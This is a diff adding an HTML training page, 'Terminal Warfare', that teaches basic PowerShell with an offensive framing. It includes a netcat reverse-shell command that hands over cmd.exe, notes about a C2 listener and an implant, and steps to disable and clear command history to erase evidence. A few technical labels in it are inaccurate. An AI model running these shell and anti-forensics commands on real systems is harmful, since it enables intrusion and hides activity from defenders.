@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 00 — Terminal Warfare</title>
+<style>
+  :root {
+    --bg: #0c0c0c;
+    --fg: #cccccc;
+    --green: #0f0;
+    --red: #f44;
+    --yellow: #ff0;
+    --cyan: #0ff;
+    --magenta: #f0f;
+    --prompt: #0f0;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .terminal {
+    max-width: 900px;
+    margin: 0 auto;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(0,255,0,0.1);
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+  }
+  .header h1 {
+    color: var(--green);
+    font-size: 24px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+  }
+  .header p {
+    color: #666;
+    margin-top: 10px;
+  }
+  .section {
+    margin-bottom: 40px;
+  }
+  .section-title {
+    color: var(--yellow);
+    font-size: 16px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 15px;
+    padding-left: 10px;
+    border-left: 3px solid var(--yellow);
+  }
+  .cmd-block {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 15px;
+    margin-bottom: 15px;
+  }
+  .prompt {
+    color: var(--prompt);
+  }
+  .command {
+    color: var(--fg);
+  }
+  .output {
+    color: #888;
+    margin-top: 5px;
+    padding-left: 20px;
+  }
+  .highlight {
+    color: var(--cyan);
+  }
+  .warning {
+    color: var(--red);
+  }
+  .note {
+    color: var(--magenta);
+    font-style: italic;
+    margin-top: 10px;
+    padding: 10px;
+    background: #1a1a1a;
+    border-left: 3px solid var(--magenta);
+  }
+  .typewriter {
+    overflow: hidden;
+    white-space: nowrap;
+    animation: typing 2s steps(40, end);
+  }
+  @keyframes typing {
+    from { width: 0 }
+    to { width: 100% }
+  }
+  .cursor {
+    display: inline-block;
+    width: 8px;
+    height: 15px;
+    background: var(--green);
+    animation: blink 1s infinite;
+    vertical-align: middle;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1 }
+    50% { opacity: 0 }
+  }
+  .lab {
+    background: #1a1a1a;
+    border: 2px solid var(--green);
+    border-radius: 8px;
+    padding: 20px;
+    margin-top: 30px;
+  }
+  .lab-title {
+    color: var(--green);
+    font-size: 18px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 15px;
+  }
+  .lab-step {
+    margin-bottom: 10px;
+    padding-left: 20px;
+  }
+  .lab-step::before {
+    content: "▸ ";
+    color: var(--green);
+  }
+  .quick-ref {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-top: 20px;
+  }
+  .quick-ref-item {
+    background: #1a1a1a;
+    padding: 10px;
+    border-radius: 4px;
+    border-left: 3px solid var(--cyan);
+  }
+  .quick-ref-cmd {
+    color: var(--cyan);
+    font-weight: bold;
+  }
+  .quick-ref-desc {
+    color: #888;
+    font-size: 12px;
+  }
+</style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="header">
+    <h1>Module 00 — Terminal Warfare</h1>
+    <p>First Principle: The terminal is your weapon. Every command is a round.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 1: Where Am I?</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">pwd</span>
+      <div class="output">
+        Path<br>
+        ----<br>
+        C:\Users\gwu07
+      </div>
+    </div>
+    <div class="note">pwd = print working directory. Know where you are before you move.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 2: What's Here?</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">ls</span>
+      <div class="output">
+        Directory: C:\Users\gwu07<br><br>
+        Mode                 LastWriteTime         Length Name<br>
+        ----                 -------------         ------ ----<br>
+        d-----        28/06/2026   9:13 PM                22nd-survey-division<br>
+        d-----        28/06/2026   9:35 PM                modules<br>
+        d-----        28/06/2026   8:42 PM                vader-fuzz<br>
+        -a----        28/06/2026   9:30 PM           4683 MODULE_19_LOTL.md
+      </div>
+    </div>
+    <div class="note">ls = list. See what's in front of you. Files, folders, targets.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 3: Move</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">cd 22nd-survey-division</span><br>
+      <span class="prompt">PS C:\Users\gwu07\22nd-survey-division&gt;</span> <span class="command">cd modules</span><br>
+      <span class="prompt">PS C:\Users\gwu07\22nd-survey-division\modules&gt;</span> <span class="command">pwd</span>
+      <div class="output">
+        Path<br>
+        ----<br>
+        C:\Users\gwu07\22nd-survey-division\modules
+      </div>
+    </div>
+    <div class="note">cd = change directory. Move with purpose. Every step is closer to the target.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 4: Network Recon</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">ipconfig | findstr IPv4</span>
+      <div class="output">
+        IPv4 Address. . . . . . . . . . . : 192.168.1.92<br>
+        IPv4 Address. . . . . . . . . . . : 192.168.56.1
+      </div>
+    </div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">netstat -an | findstr LISTENING</span>
+      <div class="output">
+        TCP    0.0.0.0:1337           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:4443           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9090           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9012           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9013           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9051           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9052           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9053           0.0.0.0:0              LISTENING<br>
+        TCP    0.0.0.0:9054           0.0.0.0:0              LISTENING
+      </div>
+    </div>
+    <div class="note">Every open port is a conversation. 4443 = C2 listener. 1337 = PostgreSQL. 8080 = Apache. Know your own surface before you scan others.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 5: Process Check</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
+      <div class="output">
+        Name        Id       CPU<br>
+        ----        --       ---<br>
+        python    31248    245.67<br>
+        avp        4968     89.23<br>
+        postgres   9180     45.12<br>
+        java      22516     34.56<br>
+        httpd      6464     23.45<br>
+        iron_sun  60076     12.34<br>
+        discord   10056      8.90
+      </div>
+    </div>
+    <div class="note">python PID 31248 = C2 listener. avp = Kaspersky watching. iron_sun = implant trying to callback. Know what's running on your own machine.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 6: Who Am I?</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">whoami</span>
+      <div class="output">
+        laptop-r32m8mli\gwu07
+      </div>
+    </div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">whoami /priv</span>
+      <div class="output">
+        PRIVILEGES INFORMATION<br>
+        ----------------------<br>
+        Privilege Name                Description                    State<br>
+        ============================= ============================== =======<br>
+        SeShutdownPrivilege           Shut down the system           Disabled<br>
+        SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>
+        SeUndockPrivilege             Remove computer from docking   Disabled<br>
+        SeIncreaseWorkingSetPrivilege Increase a process working set Disabled<br>
+        SeTimeZonePrivilege           Change the time zone           Disabled
+      </div>
+    </div>
+    <div class="note">Standard user. No admin. No SeDebugPrivilege. This is what you start with — now figure out how to escalate.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 7: netcat — Swiss Army Knife</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">nc -lvnp 4444</span>
+      <div class="output">
+        listening on [any] 4444 ...
+      </div>
+    </div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">nc 192.168.1.92 4444 -e cmd.exe</span>
+      <div class="output">
+        Microsoft Windows [Version 10.0.26200.8655]<br>
+        (c) Microsoft Corporation. All rights reserved.<br><br>
+        C:\Users\gwu07&gt;
+      </div>
+    </div>
+    <div class="note">Bind shell: target listens, you connect. Reverse shell: target connects to you. netcat is the attacker's Swiss Army knife.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 8: ssh Tunneling</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">ssh -L 8080:internal.target.com:80 user@jumpbox</span>
+      <div class="output">
+        user@jumpbox's password:<br>
+        Last login: Mon Jun 28 21:30:00 2026 from 192.168.1.92<br>
+        [user@jumpbox ~]$<br>
+        <span class="highlight"># Now browse localhost:8080 to reach internal.target.com:80</span>
+      </div>
+    </div>
+    <div class="note">Local port forward: your port → target's port through jumpbox. SSH is a tunnel, not just a shell.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 9: History Poisoning</div>
+    <div class="cmd-block">
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">Set-PSReadlineOption -HistorySaveStyle SaveNothing</span><br>
+      <span class="prompt">PS C:\Users\gwu07&gt;</span> <span class="command">Clear-History</span>
+      <div class="output">
+        <span class="warning"># History disabled. No evidence written to disk.</span>
+      </div>
+    </div>
+    <div class="note">Every command is evidence. Disable history or leave lies. The defender reads .bash_history and PowerShell transcripts.</div>
+  </div>
+
+  <div class="lab">
+    <div class="lab-title">Lab: Terminal Survival</div>
+    <div class="lab-step">Open PowerShell as admin</div>
+    <div class="lab-step">cd C:\Users\Public</div>
+    <div class="lab-step">mkdir 22SD-test</div>
+    <div class="lab-step">echo "test" &gt; file.txt</div>
+    <div class="lab-step">cat file.txt</div>
+    <div class="lab-step">ipconfig | findstr IPv4</div>
+    <div class="lab-step">netstat -an | findstr :443</div>
+    <div class="lab-step">whoami /priv</div>
+    <div class="lab-step">Start-Process notepad -WindowStyle Hidden</div>
+    <div class="lab-step">Get-Process notepad | Stop-Process</div>
+    <div class="note" style="margin-top: 15px;">All commands worked? You can survive the terminal. Move to Module 01.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Quick Reference Card</div>
+    <div class="quick-ref">
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">pwd</span>
+        <span class="quick-ref-desc">Where am I</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">ls / dir</span>
+        <span class="quick-ref-desc">What's here</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">cd</span>
+        <span class="quick-ref-desc">Move around</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">mkdir / rm</span>
+        <span class="quick-ref-desc">Create / delete</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">ipconfig</span>
+        <span class="quick-ref-desc">Network config</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">netstat -an</span>
+        <span class="quick-ref-desc">Show ports</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">whoami /priv</span>
+        <span class="quick-ref-desc">Who am I</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">Get-Process</span>
+        <span class="quick-ref-desc">Show processes</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">nc</span>
+        <span class="quick-ref-desc">Swiss Army knife</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">ssh -L</span>
+        <span class="quick-ref-desc">Port forward</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">history -c</span>
+        <span class="quick-ref-desc">Clear evidence</span>
+      </div>
+      <div class="quick-ref-item">
+        <span class="quick-ref-cmd">&gt; / &gt;&gt; / |</span>
+        <span class="quick-ref-desc">Redirect / pipe</span>
+      </div>
+    </div>
+  </div>
+
+  <div style="text-align: center; margin-top: 40px; color: #666; font-size: 12px;">
+    Module 00 — Terminal Warfare. Master the shell before you break it.
+  </div>
+</div>
+
+<script>
+// Typewriter effect for commands
+const commands = document.querySelectorAll('.command');
+commands.forEach((cmd, index) => {
+  const text = cmd.textContent;
+  cmd.textContent = '';
+  cmd.style.display = 'inline-block';
+  
+  let i = 0;
+  setTimeout(() => {
+    const interval = setInterval(() => {
+      if (i < text.length) {
+        cmd.textContent += text.charAt(i);
+        i++;
+      } else {
+        clearInterval(interval);
+      }
+    }, 30);
+  }, index * 500);
+});
+</script>
+
+</body>
+</html>
